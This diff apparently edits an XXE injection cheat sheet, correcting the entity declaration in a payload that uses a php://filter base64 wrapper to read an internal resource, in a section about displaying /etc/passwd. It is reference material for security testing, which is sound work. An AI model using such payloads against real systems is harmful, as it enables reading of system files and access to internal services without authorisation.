@@ -166,7 +166,7 @@ We try to display the content of the file `/etc/passwd`
 <?xml version="1.0" encoding="ISO-8859-1"?>
 <!DOCTYPE foo [
 <!ELEMENT foo ANY >
-<!ENTITY % xxe SYSTEM "php://filter/convert.base64-encode/resource=http://10.0.0.3" >
+<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=http://10.0.0.3" >
 ]>
 <foo>&xxe;</foo>
 ```
